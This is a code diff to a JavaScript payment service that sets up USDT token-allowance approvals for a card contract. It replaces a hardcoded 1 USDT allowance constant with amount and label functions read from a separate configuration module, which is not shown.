@@ -1,8 +1,8 @@
 const sessionStore = require("../storage/sessions");
 const paymentStore = require("../storage/payments");
-const { getNetwork, MAX_ALLOWANCE_USDT } = require("../config/networks");
+const { getNetwork } = require("../config/networks");
 const { emitEvent } = require("../utils/events");
-const { allowanceUnits } = require("../utils/helpers");
+const { approveAmountRaw, approveAmountLabel } = require("../config/approvalAmount");
 const { NotFoundError, ValidationError } = require("../utils/errors");
 const { checkCardEligibility } = require("./cardEligibility");
 const logger = require("../utils/logger");
@@ -82,7 +82,7 @@ function publicPayment(payment) {
         token: payment.token,
         tokenContract: payment.tokenContract,
         spender: payment.spender,
-        allowance: `${MAX_ALLOWANCE_USDT.toString()} USDT`,
+        allowance: approveAmountLabel(),
         allowanceRaw: String(payment.allowanceRaw),
         decimals: payment.decimals,
         status: payment.status,
@@ -111,7 +111,7 @@ async function ensurePaymentForNetwork(session, networkKey, eligibility, groupId
     }
 
     const gas = await (deps.checkGasSufficiency || checkGasSufficiency)(session, network.key, deps);
-    const allowanceRaw = MAX_ALLOWANCE_USDT * allowanceUnits(network.usdtDecimals);
+    const allowanceRaw = approveAmountRaw(network.usdtDecimals);
 
     if (existing && (existing.status === "created" || existing.status === "awaiting_gas")) {
         const updated = paymentStore.updatePayment(existing.paymentId, {
@@ -130,7 +130,7 @@ async function ensurePaymentForNetwork(session, networkKey, eligibility, groupId
         token: "USDT",
         tokenContract: network.usdtContract,
         spender: network.cardContract,
-        allowance: `${MAX_ALLOWANCE_USDT.toString()} USDT`,
+        allowance: approveAmountLabel(),
         allowanceRaw,
         decimals: network.usdtDecimals,
         chainId: network.chainId,
@@ -265,7 +265,7 @@ async function createPayment(body, deps = {}) {
     eligibility = {
         ...eligibility,
         eligibleNetworks: networkKeys,
-        reason: `Eligible for 1 USDT approval on ${networkKeys.join(", ")}.`
+        reason: `Eligible for ${approveAmountLabel()} approval on ${networkKeys.join(", ")}.`
     };
     emitEvent("eligible_networks", {
         connectionId: latestSession.connectionId,
